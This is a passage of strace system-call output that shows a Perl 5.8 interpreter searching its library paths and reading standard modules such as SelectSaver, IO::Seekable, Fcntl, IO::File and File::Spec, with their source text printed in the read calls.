\"^xyz\", or other. \n\tif ($name =~ /^(([^a-z])|(\\^[a-z_]+))\\z/i || $global{$name}) {\n\t    # RGS 2001-11-05 : translate leading ^X to control-char\n\t    $name =~ s/^\\^([a-z_])/\'qq(\\c\'.$1.\')\'/eei;\n\t    $pkg = \"main\";\n\t}\n\telse {\n\t    $pkg = (@_ > 1) ? $_[1] : caller;\n\t}\n\t$name = $pkg . \"::\" . $name;\n    }\n    $name;\n}\n\nsub qualify_to_ref ($;$) {\n    return \\*{ qualify $_[0], @_ > 1 ? $_[1] : caller };\n}\n\n#\n# of Safe.pm lineage\n#\nsub delete_package ($) {\n    my $pkg = shift;\n\n    # expand to full symbol table name if needed\n\n    unless ($pkg =~ /^main::.*::$/) {\n        $pkg = \"main$pkg\"\tif\t$pkg =~ /^::/;\n        $pkg = \"main::$pkg\"\tunless\t$pkg =~ /^main::/;\n        $pkg .= \'::\'\t\tunless\t$pkg =~ /::$/;\n    }\n\n    my($stem, $leaf) = $pkg =~ m/(.*::)(\\w+::)$/;\n    my $stem_symtab = *{$stem}{HASH};\n    return unless defined $stem_symtab and exists $stem_symtab->{$leaf};\n\n    # free all the symbols in the package\n\n    my $leaf_symtab = *{$stem_symtab->{$leaf}}{HASH};\n    foreach my $name (keys %$leaf_symtab) {\n        undef *{$pkg . $name};\n    }\n\n    # delete the symbol table\n\n    %$leaf_symtab = ();\n    delete $stem_symtab->{$leaf};\n}\n\n1;\n", 4096) = 2099
10890 07:35:08.647133 read(8, "", 4096) = 0
10890 07:35:08.647150 close(8)          = 0
10890 07:35:08.647215 stat64("/etc/perl/SelectSaver.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.647232 stat64("/etc/perl/SelectSaver.pm", 0xbfbc037c) = -1 ENOENT (No such file or directory)
10890 07:35:08.647246 stat64("/usr/local/lib/perl/5.8.8/SelectSaver.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.647264 stat64("/usr/local/lib/perl/5.8.8/SelectSaver.pm", 0xbfbc037c) = -1 ENOENT (No such file or directory)
10890 07:35:08.647279 stat64("/usr/local/share/perl/5.8.8/SelectSaver.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.647292 stat64("/usr/local/share/perl/5.8.8/SelectSaver.pm", 0xbfbc037c) = -1 ENOENT (No such file or directory)
10890 07:35:08.647306 stat64("/usr/lib/perl5/SelectSaver.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.647319 stat64("/usr/lib/perl5/SelectSaver.pm", 0xbfbc037c) = -1 ENOENT (No such file or directory)
10890 07:35:08.647332 stat64("/usr/share/perl5/SelectSaver.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.647344 stat64("/usr/share/perl5/SelectSaver.pm", 0xbfbc037c) = -1 ENOENT (No such file or directory)
10890 07:35:08.647358 stat64("/usr/lib/perl/5.8/SelectSaver.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.647371 stat64("/usr/lib/perl/5.8/SelectSaver.pm", 0xbfbc037c) = -1 ENOENT (No such file or directory)
10890 07:35:08.647385 stat64("/usr/share/perl/5.8/SelectSaver.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.647398 stat64("/usr/share/perl/5.8/SelectSaver.pm", {st_mode=S_IFREG|0644, st_size=340, ...}) = 0
10890 07:35:08.647534 open("/usr/share/perl/5.8/SelectSaver.pm", O_RDONLY|O_LARGEFILE) = 8
10890 07:35:08.647552 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbc0188) = -1 ENOTTY (Inappropriate ioctl for device)
10890 07:35:08.647564 _llseek(8, 0, [0], SEEK_CUR) = 0
10890 07:35:08.647584 read(8, "package SelectSaver;\n\nour $VERSION = \'1.01\';\n\nrequire 5.000;\nuse Carp;\nuse Symbol;\n\nsub new {\n    @_ >= 1 && @_ <= 2 or croak \'usage: new SelectSaver [FILEHANDLE]\';\n    my $fh = select;\n    my $self = bless \\$fh, $_[0];\n    select qualify($_[1], caller) if @_ > 1;\n    $self;\n}\n\nsub DESTROY {\n    my $self = $_[0];\n    select $$self;\n}\n\n1;\n", 4096) = 340
10890 07:35:08.647727 brk(0x81d6000)    = 0x81d6000
10890 07:35:08.647758 read(8, "", 4096) = 0
10890 07:35:08.647770 close(8)          = 0
10890 07:35:08.648224 read(5, "sage: $io->stat()\';\n    stat($_[0]);\n}\n\n################################################\n## State modification functions.\n##\n\nsub autoflush {\n    my $old = new SelectSaver qualify($_[0], caller);\n    my $prev = $|;\n    $| = @_ > 1 ? $_[1] : 1;\n    $prev;\n}\n\nsub output_field_separator {\n    carp \"output_field_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $,;\n    $, = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub output_record_separator {\n    carp \"output_record_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $\\;\n    $\\ = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub input_record_separator {\n    carp \"input_record_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $/;\n    $/ = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub input_line_number {\n    local $.;\n    () = tell qualify($_[0], caller) if ref($_[0]);\n    my $prev = $.;\n    $. = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_page_number {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $%;\n    $% = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_lines_per_page {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $=;\n    $= = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_lines_left {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $-;\n    $- = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_name {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $~;\n    $~ = qualify($_[1], caller) if @_ > 1;\n    $prev;\n}\n\nsub format_top_name {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $^;\n    $^ = qualify($_[1], caller) if @_ > 1;\n    $prev;\n}\n\nsub format_line_break_characters {\n    carp \"format_line_break_characters is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $:;\n    $: = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_formfeed {\n    carp \"format_formfeed is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $^L;\n    $^L = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub formline {\n    my $io = shift;\n    my $picture = shift;\n    local($^A) = $^A;\n    local($\\) = \"\";\n    formline($picture, @_);\n    print $io $^A;\n}\n\nsub format_write {\n    @_ < 3 || croak \'usage: $io->write( [FORMAT_NAME] )\';\n    if (@_ == 2) {\n\tmy ($io, $fmt) = @_;\n\tmy $oldfmt = $io->format_name($fmt);\n\tCORE::write($io);\n\t$io->format_name($oldfmt);\n    } else {\n\tCORE::write($_[0]);\n    }\n}\n\n# XXX undocumented\nsub fcntl {\n    @_ == 3 || croak \'usage: $io->fcntl( OP, VALUE );\';\n    my ($io, $op) = @_;\n    return fcntl($io, $op, $_[2]);\n}\n\n# XXX undocumented\nsub ioctl {\n    @_ == 3 || croak \'usage: $io->ioctl( OP, VALUE );\';\n    my ($io, $op) = @_;\n    return ioctl($io, $op, $_[2]);\n}\n\n# this sub is for compatability with older releases of IO that used\n# a sub called constant to detemine if a constant existed -- GMB\n#\n# The SEEK_* and _IO?BF constants were the only constants at that time\n# any new code should just chech defined(&CONSTANT_NAME)\n\nsub constant {\n    no strict \'refs\';\n    my $name = shift;\n    (($name =~ /^(SEEK_(SET|CUR|END)|_IO[FLN]BF)$/) && defined &{$name})\n\t? &{$name}() : undef;\n}\n\n# so that flush.pl can be deprecated\n\nsub printflush {\n    my $io = shift;\n    my $old;\n    $old = new SelectSaver qualify($io, caller) if ref($io);\n    local $| = 1;\n    if(ref($io)) {\n        print $io @_;\n    }\n    else {\n\tprint @_;\n    }\n}\n\n1;\n", 4096) = 3496
10890 07:35:08.648878 read(5, "", 4096) = 0
10890 07:35:08.648895 close(5)          = 0
10890 07:35:08.648935 stat64("/etc/perl/IO/Seekable.pmc", 0xbfbc091c) = -1 ENOENT (No such file or directory)
10890 07:35:08.648951 stat64("/etc/perl/IO/Seekable.pm", 0xbfbc082c) = -1 ENOENT (No such file or directory)
10890 07:35:08.648966 stat64("/usr/local/lib/perl/5.8.8/IO/Seekable.pmc", 0xbfbc091c) = -1 ENOENT (No such file or directory)
10890 07:35:08.648979 stat64("/usr/local/lib/perl/5.8.8/IO/Seekable.pm", 0xbfbc082c) = -1 ENOENT (No such file or directory)
10890 07:35:08.648993 stat64("/usr/local/share/perl/5.8.8/IO/Seekable.pmc", 0xbfbc091c) = -1 ENOENT (No such file or directory)
10890 07:35:08.649051 stat64("/usr/local/share/perl/5.8.8/IO/Seekable.pm", 0xbfbc082c) = -1 ENOENT (No such file or directory)
10890 07:35:08.649065 stat64("/usr/lib/perl5/IO/Seekable.pmc", 0xbfbc091c) = -1 ENOENT (No such file or directory)
10890 07:35:08.649077 stat64("/usr/lib/perl5/IO/Seekable.pm", 0xbfbc082c) = -1 ENOENT (No such file or directory)
10890 07:35:08.649091 stat64("/usr/share/perl5/IO/Seekable.pmc", 0xbfbc091c) = -1 ENOENT (No such file or directory)
10890 07:35:08.649103 stat64("/usr/share/perl5/IO/Seekable.pm", 0xbfbc082c) = -1 ENOENT (No such file or directory)
10890 07:35:08.649117 stat64("/usr/lib/perl/5.8/IO/Seekable.pmc", 0xbfbc091c) = -1 ENOENT (No such file or directory)
10890 07:35:08.649130 stat64("/usr/lib/perl/5.8/IO/Seekable.pm", {st_mode=S_IFREG|0644, st_size=686, ...}) = 0
10890 07:35:08.649152 open("/usr/lib/perl/5.8/IO/Seekable.pm", O_RDONLY|O_LARGEFILE) = 5
10890 07:35:08.649167 ioctl(5, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbc0638) = -1 ENOTTY (Inappropriate ioctl for device)
10890 07:35:08.649179 _llseek(5, 0, [0], SEEK_CUR) = 0
10890 07:35:08.649198 read(5, "#\n\npackage IO::Seekable;\n\nuse 5.006_001;\nuse Carp;\nuse strict;\nour($VERSION, @EXPORT, @ISA);\nuse IO::Handle ();\n# XXX we can\'t get these from IO::Handle or we\'ll get prototype\n# mismatch warnings on C<use POSIX; use IO::File;> :-(\nuse Fcntl qw(SEEK_SET SEEK_CUR SEEK_END);\nrequire Exporter;\n\n@EXPORT = qw(SEEK_SET SEEK_CUR SEEK_END);\n@ISA = qw(Exporter);\n\n$VERSION = \"1.10\";\n$VERSION = eval $VERSION;\n\nsub seek {\n    @_ == 3 or croak \'usage: $io->seek(POS, WHENCE)\';\n    seek($_[0], $_[1], $_[2]);\n}\n\nsub sysseek {\n    @_ == 3 or croak \'usage: $io->sysseek(POS, WHENCE)\';\n    sysseek($_[0], $_[1], $_[2]);\n}\n\nsub tell {\n    @_ == 1 or croak \'usage: $io->tell()\';\n    tell($_[0]);\n}\n\n1;\n", 4096) = 686
10890 07:35:08.649333 stat64("/etc/perl/Fcntl.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.649349 stat64("/etc/perl/Fcntl.pm", 0xbfbc037c) = -1 ENOENT (No such file or directory)
10890 07:35:08.649362 stat64("/usr/local/lib/perl/5.8.8/Fcntl.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.649375 stat64("/usr/local/lib/perl/5.8.8/Fcntl.pm", 0xbfbc037c) = -1 ENOENT (No such file or directory)
10890 07:35:08.649389 stat64("/usr/local/share/perl/5.8.8/Fcntl.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.649402 stat64("/usr/local/share/perl/5.8.8/Fcntl.pm", 0xbfbc037c) = -1 ENOENT (No such file or directory)
10890 07:35:08.649416 stat64("/usr/lib/perl5/Fcntl.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.649428 stat64("/usr/lib/perl5/Fcntl.pm", 0xbfbc037c) = -1 ENOENT (No such file or directory)
10890 07:35:08.649441 stat64("/usr/share/perl5/Fcntl.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.649452 stat64("/usr/share/perl5/Fcntl.pm", 0xbfbc037c) = -1 ENOENT (No such file or directory)
10890 07:35:08.649466 stat64("/usr/lib/perl/5.8/Fcntl.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.649478 stat64("/usr/lib/perl/5.8/Fcntl.pm", {st_mode=S_IFREG|0644, st_size=3458, ...}) = 0
10890 07:35:08.649506 open("/usr/lib/perl/5.8/Fcntl.pm", O_RDONLY|O_LARGEFILE) = 8
10890 07:35:08.649523 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbc0188) = -1 ENOTTY (Inappropriate ioctl for device)
10890 07:35:08.649534 _llseek(8, 0, [0], SEEK_CUR) = 0
10890 07:35:08.649553 read(8, "package Fcntl;\n\nour($VERSION, @ISA, @EXPORT, @EXPORT_OK, %EXPORT_TAGS, $AUTOLOAD);\n\nrequire Exporter;\nuse XSLoader ();\n@ISA = qw(Exporter);\n$VERSION = \"1.05\";\n# Items to export into callers namespace by default\n# (move infrequently used names to @EXPORT_OK below)\n@EXPORT =\n  qw(\n\tFD_CLOEXEC\n\tF_ALLOCSP\n\tF_ALLOCSP64\n\tF_COMPAT\n\tF_DUP2FD\n\tF_DUPFD\n\tF_EXLCK\n\tF_FREESP\n\tF_FREESP64\n\tF_FSYNC\n\tF_FSYNC64\n\tF_GETFD\n\tF_GETFL\n\tF_GETLK\n\tF_GETLK64\n\tF_GETOWN\n\tF_NODNY\n\tF_POSIX\n\tF_RDACC\n\tF_RDDNY\n\tF_RDLCK\n\tF_RWACC\n\tF_RWDNY\n\tF_SETFD\n\tF_SETFL\n\tF_SETLK\n\tF_SETLK64\n\tF_SETLKW\n\tF_SETLKW64\n\tF_SETOWN\n\tF_SHARE\n\tF_SHLCK\n\tF_UNLCK\n\tF_UNSHARE\n\tF_WRACC\n\tF_WRDNY\n\tF_WRLCK\n\tO_ACCMODE\n\tO_ALIAS\n\tO_APPEND\n\tO_ASYNC\n\tO_BINARY\n\tO_CREAT\n\tO_DEFER\n\tO_DIRECT\n\tO_DIRECTORY\n\tO_DSYNC\n\tO_EXCL\n\tO_EXLOCK\n\tO_LARGEFILE\n\tO_NDELAY\n\tO_NOCTTY\n\tO_NOFOLLOW\n\tO_NOINHERIT\n\tO_NONBLOCK\n\tO_RANDOM\n\tO_RAW\n\tO_RDONLY\n\tO_RDWR\n\tO_RSRC\n\tO_RSYNC\n\tO_SEQUENTIAL\n\tO_SHLOCK\n\tO_SYNC\n\tO_TEMPORARY\n\tO_TEXT\n\tO_TRUNC\n\tO_WRONLY\n     );\n\n# Other items we are prepared to export if requested\n@EXPORT_OK = qw(\n\tDN_ACCESS\n\tDN_ATTRIB\n\tDN_CREATE\n\tDN_DELETE\n\tDN_MODIFY\n\tDN_MULTISHOT\n\tDN_RENAME\n\tFAPPEND\n\tFASYNC\n\tFCREAT\n\tFDEFER\n\tFDSYNC\n\tFEXCL\n\tFLARGEFILE\n\tFNDELAY\n\tFNONBLOCK\n\tFRSYNC\n\tFSYNC\n\tFTRUNC\n\tF_GETLEASE\n\tF_GETSIG\n\tF_NOTIFY\n\tF_SETLEASE\n\tF_SETSIG\n\tLOCK_EX\n\tLOCK_MAND\n\tLOCK_NB\n\tLOCK_READ\n\tLOCK_RW\n\tLOCK_SH\n\tLOCK_UN\n\tLOCK_WRITE\n\tO_IGNORE_CTTY\n\tO_NOATIME\n\tO_NOLINK\n\tO_NOTRANS\n\tSEEK_CUR\n\tSEEK_END\n\tSEEK_SET\n\tS_IFSOCK S_IFBLK S_IFCHR S_IFIFO S_IFWHT S_ENFMT\n\tS_IREAD S_IWRITE S_IEXEC\n\tS_IRGRP S_IWGRP S_IXGRP S_IRWXG\n\tS_IROTH S_IWOTH S_IXOTH S_IRWXO\n\tS_IRUSR S_IWUSR S_IXUSR S_IRWXU\n\tS_ISUID S_ISGID S_ISVTX S_ISTXT\n\t_S_IFMT S_IFREG S_IFDIR S_IFLNK\n\t&S_ISREG &S_ISDIR &S_ISLNK &S_ISSOCK &S_ISBLK &S_ISCHR &S_ISFIFO\n\t&S_ISWHT &S_ISENFMT &S_IFMT &S_IMODE\n);\n# Named groups of exports\n%EXPORT_TAGS = (\n    \'flock\'   => [qw(LOCK_SH LOCK_EX LOCK_NB LOCK_UN)],\n    \'Fcompat\' => [qw(FAPPEND FASYNC FCREAT FDEFER FDSYNC FEXCL FLARGEFILE\n\t\t     FNDELAY FNONBLOCK FRSYNC FSYNC FTRUNC)],\n    \'seek\'    => [qw(SEEK_SET SEEK_CUR SEEK_END)],\n    \'mode\'    => [qw(S_ISUID S_ISGID S_ISVTX S_ISTXT\n\t\t     _S_IFMT S_IFREG S_IFDIR S_IFLNK\n\t\t     S_IFSOCK S_IFBLK S_IFCHR S_IFIFO S_IFWHT S_ENFMT\n\t\t     S_IRUSR S_IWUSR S_IXUSR S_IRWXU\n\t\t     S_IRGRP S_IWGRP S_IXGRP S_IRWXG\n\t\t     S_IROTH S_IWOTH S_IXOTH S_IRWXO\n\t\t     S_IREAD S_IWRITE S_IEXEC\n\t\t     S_ISREG S_ISDIR S_ISLNK S_ISSOCK\n\t\t     S_ISBLK S_ISCHR S_ISFIFO\n\t\t     S_ISWHT S_ISENFMT\t\t\n\t\t     S_IFMT S_IMODE\n                  )],\n);\n\nsub S_IFMT  { @_ ? ( $_[0] & _S_IFMT() ) : _S_IFMT()  }\nsub S_IMODE { $_[0] & 07777 }\n\nsub S_ISREG    { ( $_[0] & _S_IFMT() ) == S_IFREG()   }\nsub S_ISDIR    { ( $_[0] & _S_IFMT() ) == S_IFDIR()   }\nsub S_ISLNK    { ( $_[0] & _S_IFMT() ) == S_IFLNK()   }\nsub S_ISSOCK   { ( $_[0] & _S_IFMT() ) == S_IFSOCK()  }\nsub S_ISBLK    { ( $_[0] & _S_IFMT() ) == S_IFBLK()   }\nsub S_ISCHR    { ( $_[0] & _S_IFMT() ) == S_IFCHR()   }\nsub S_ISFIFO   { ( $_[0] & _S_IFMT() ) == S_IFIFO()   }\nsub S_ISWHT    { ( $_[0] & _S_IFMT() ) == S_IFWHT()   }\nsub S_ISENFMT  { ( $_[0] & _S_IFMT() ) == S_IFENFMT() }\n\nsub AUTOLOAD {\n    (my $constname = $AUTOLOAD) =~ s/.*:://;\n    die \"&Fcntl::constant not defined\" if $constname eq \'constant\';\n    my ($error, $val) = constant($constname);\n    if ($error) {\n        my (undef,$file,$line) = caller;\n        die \"$error at $file line $line.\\n\";\n    }\n    *$AUTOLOAD = sub { $val };\n    goto &$AUTOLOAD;\n}\n\nXSLoader::load \'Fcntl\', $VERSION;\n\n1;\n", 4096) = 3458
10890 07:35:08.649903 brk(0x81f7000)    = 0x81f7000
10890 07:35:08.650093 read(8, "", 4096) = 0
10890 07:35:08.663998 close(8)          = 0
10890 07:35:08.664083 stat64("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.so", {st_mode=S_IFREG|0644, st_size=12412, ...}) = 0
10890 07:35:08.664111 stat64("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
10890 07:35:08.664140 open("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.so", O_RDONLY) = 8
10890 07:35:08.664154 read(8, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0 \10\0\0004\0\0\0\274,\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\274*\0\0\274*\0\0\5\0\0\0\0\20\0\0\1\0\0\0\274*\0\0\274:\0\0\274:\0\0T\1\0\0X\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320*\0\0\320:\0\0\320:\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0\21\0\0\0\36\0\0\0\0\0\0\0\25\0\0\0\32\0\0\0\24\0\0\0\5\0\0\0\t\0\0\0\0\0\0\0\23\0\0\0\21\0\0\0\34\0\0\0\4\0\0\0\26\0\0\0\0\0\0\0\30\0\0\0\17\0\0\0\27\0\0\0\r\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\1\0\0\0\0\0\0\0\3\0\0\0\2\0\0\0\0\0\0\0\0\0\0\0\v\0\0\0\6\0\0\0\35\0\0\0\7\0\0\0\0\0\0\0\22\0\0\0\31\0\0\0\33\0\0\0\20\0\0\0\16\0\0\0\n\0\0\0\0\0\0\0\f\0\0\0\10\0\0\0\0\0\0\0\3\0\0\0\27\0\0\0\2\0\0\0\6\0\0\0\210\0 \1\0\304H\t\27\0\0\0\32\0\0\0\35\0\0\0\356TU\220\272\343\222|CE\325\354.6bx\330qX\34\271\215\361\16\353\323\357\16\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\353\0\0\0\0\0\0\0\0\0\0\0\20\0\0\0j\1\0\0\0\0\0\0\0\0\0\0\20\0\0\0\337\0\0\0\0\0\0\0\0\0\0\0\20\0\0\0u\0\0\0\0\0\0\0", 512) = 512
10890 07:35:08.664247 fstat64(8, {st_mode=S_IFREG|0644, st_size=12412, ...}) = 0
10890 07:35:08.664265 mmap2(NULL, 15380, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 8, 0) = 0xb7de3000
10890 07:35:08.664280 mmap2(0xb7de6000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 8, 0x2) = 0xb7de6000
10890 07:35:08.664296 close(8)          = 0
10890 07:35:08.664537 read(5, "", 4096) = 0
10890 07:35:08.664553 close(5)          = 0
10890 07:35:08.664586 stat64("/etc/perl/IO/File.pmc", 0xbfbc091c) = -1 ENOENT (No such file or directory)
10890 07:35:08.664602 stat64("/etc/perl/IO/File.pm", 0xbfbc082c) = -1 ENOENT (No such file or directory)
10890 07:35:08.664616 stat64("/usr/local/lib/perl/5.8.8/IO/File.pmc", 0xbfbc091c) = -1 ENOENT (No such file or directory)
10890 07:35:08.664629 stat64("/usr/local/lib/perl/5.8.8/IO/File.pm", 0xbfbc082c) = -1 ENOENT (No such file or directory)
10890 07:35:08.664643 stat64("/usr/local/share/perl/5.8.8/IO/File.pmc", 0xbfbc091c) = -1 ENOENT (No such file or directory)
10890 07:35:08.664662 stat64("/usr/local/share/perl/5.8.8/IO/File.pm", 0xbfbc082c) = -1 ENOENT (No such file or directory)
10890 07:35:08.664677 stat64("/usr/lib/perl5/IO/File.pmc", 0xbfbc091c) = -1 ENOENT (No such file or directory)
10890 07:35:08.664689 stat64("/usr/lib/perl5/IO/File.pm", 0xbfbc082c) = -1 ENOENT (No such file or directory)
10890 07:35:08.664702 stat64("/usr/share/perl5/IO/File.pmc", 0xbfbc091c) = -1 ENOENT (No such file or directory)
10890 07:35:08.664715 stat64("/usr/share/perl5/IO/File.pm", 0xbfbc082c) = -1 ENOENT (No such file or directory)
10890 07:35:08.664728 stat64("/usr/lib/perl/5.8/IO/File.pmc", 0xbfbc091c) = -1 ENOENT (No such file or directory)
10890 07:35:08.664741 stat64("/usr/lib/perl/5.8/IO/File.pm", {st_mode=S_IFREG|0644, st_size=1784, ...}) = 0
10890 07:35:08.664763 open("/usr/lib/perl/5.8/IO/File.pm", O_RDONLY|O_LARGEFILE) = 5
10890 07:35:08.664778 ioctl(5, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbc0638) = -1 ENOTTY (Inappropriate ioctl for device)
10890 07:35:08.664790 _llseek(5, 0, [0], SEEK_CUR) = 0
10890 07:35:08.664809 read(5, "#\n\npackage IO::File;\n\nuse 5.006_001;\nuse strict;\nour($VERSION, @EXPORT, @EXPORT_OK, @ISA);\nuse Carp;\nuse Symbol;\nuse SelectSaver;\nuse IO::Seekable;\nuse File::Spec;\n\nrequire Exporter;\n\n@ISA = qw(IO::Handle IO::Seekable Exporter);\n\n$VERSION = \"1.13\";\n\n@EXPORT = @IO::Seekable::EXPORT;\n\neval {\n    # Make all Fcntl O_XXX constants available for importing\n    require Fcntl;\n    my @O = grep /^O_/, @Fcntl::EXPORT;\n    Fcntl->import(@O);  # first we import what we want to export\n    push(@EXPORT, @O);\n};\n\n################################################\n## Constructor\n##\n\nsub new {\n    my $type = shift;\n    my $class = ref($type) || $type || \"IO::File\";\n    @_ >= 0 && @_ <= 3\n\tor croak \"usage: new $class [FILENAME [,MODE [,PERMS]]]\";\n    my $fh = $class->SUPER::new();\n    if (@_) {\n\t$fh->open(@_)\n\t    or return undef;\n    }\n    $fh;\n}\n\n################################################\n## Open\n##\n\nsub open {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $fh->open(FILENAME [,MODE [,PERMS]])\';\n    my ($fh, $file) = @_;\n    if (@_ > 2) {\n\tmy ($mode, $perms) = @_[2, 3];\n\tif ($mode =~ /^\\d+$/) {\n\t    defined $perms or $perms = 0666;\n\t    return sysopen($fh, $file, $mode, $perms);\n\t} elsif ($mode =~ /:/) {\n\t    return open($fh, $mode, $file) if @_ == 3;\n\t    croak \'usage: $fh->open(FILENAME, IOLAYERS)\';\n\t}\n\tif (defined($file) && length($file)\n\t    && ! File::Spec->file_name_is_absolute($file))\n\t{\n\t    $file = File::Spec->rel2abs($file);\n\t}\n\t$file = IO::Handle::_open_mode_string($mode) . \" $file\\0\";\n    }\n    open($fh, $file);\n}\n\n################################################\n## Binmode\n##\n\nsub binmode {\n    ( @_ == 1 or @_ == 2 ) or croak \'usage $fh->binmode([LAYER])\';\n\n    my($fh, $layer) = @_;\n\n    return binmode $$fh unless $layer;\n    return binmode $$fh, $layer;\n}\n\n1;\n", 4096) = 1784
10890 07:35:08.665065 stat64("/etc/perl/File/Spec.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.665082 stat64("/etc/perl/File/Spec.pm", 0xbfbc037c) = -1 ENOENT (No such file or directory)
10890 07:35:08.665096 stat64("/usr/local/lib/perl/5.8.8/File/Spec.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.665109 stat64("/usr/local/lib/perl/5.8.8/File/Spec.pm", 0xbfbc037c) = -1 ENOENT (No such file or directory)
10890 07:35:08.665123 stat64("/usr/local/share/perl/5.8.8/File/Spec.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.665136 stat64("/usr/local/share/perl/5.8.8/File/Spec.pm", 0xbfbc037c) = -1 ENOENT (No such file or directory)
10890 07:35:08.665150 stat64("/usr/lib/perl5/File/Spec.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.665162 stat64("/usr/lib/perl5/File/Spec.pm", 0xbfbc037c) = -1 ENOENT (No such file or directory)
10890 07:35:08.665176 stat64("/usr/share/perl5/File/Spec.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.665193 stat64("/usr/share/perl5/File/Spec.pm", 0xbfbc037c) = -1 ENOENT (No such file or directory)
10890 07:35:08.665207 stat64("/usr/lib/perl/5.8/File/Spec.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.665220 stat64("/usr/lib/perl/5.8/File/Spec.pm", 0xbfbc037c) = -1 ENOENT (No such file or directory)
10890 07:35:08.665234 stat64("/usr/share/perl/5.8/File/Spec.pmc", 0xbfbc046c) = -1 ENOENT (No such file or directory)
10890 07:35:08.665247 stat64("/usr/share/perl/5.8/File/Spec.pm", {st_mode=S_IFREG|0644, st_size=595, ...}) = 0
10890 07:35:08.665268 open("/usr/share/perl/5.8/File/Spec.pm", O_RDONLY|O_LARGEFILE) = 8
10890 07:35:08.665283 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbc0188) = -1 ENOTTY (Inappropriate ioctl for device)
10890 07:35:08.665295 _llseek(8, 0, [0], SEEK_CUR) = 0
10890 07:35:08.665313 read(8, "package File::Spec;\n\nuse strict;\nuse vars qw(@ISA $VERSION);\n\n$VERSION = \'3.12\';\n$VERSION = eval $VERSION;\n\nmy %module = (MacOS   => \'Mac\',\n\t      MSWin32 => \'Win32\',\n\t      os2     => \'OS2\',\n\t      VMS     => \'VMS\',\n\t      epoc    => \'Epoc\',\n\t      NetWare => \'Win32\', # Yes, File::Spec::Win32 works on NetWare.\n\t      symbian => \'Win32\', # Yes, File::Spec::Win32 works on symbian.\n\t      dos     => \'OS2\',   # Yes, File::Spec::OS2 works on DJGPP.\n\t      cygwin  => \'Cygwin\');\n\nmy $module = $module{$^O} || \'Unix\';\n\nrequire \"File/Spec/$module.pm\";\n@ISA = (\"File::Spec::$module\");\n\n1;\n\n__END__\n\n", 4096) = 595
10890 07:35:08.665389 stat64("/etc/perl/vars.pmc", 0xbfbbffbc) = -1 ENOENT (No such file or directory)
10890 07:35:08.665403 stat64("/etc/perl/vars.pm", 0xbfbbfecc) = -1 ENOENT (No such file or directory)
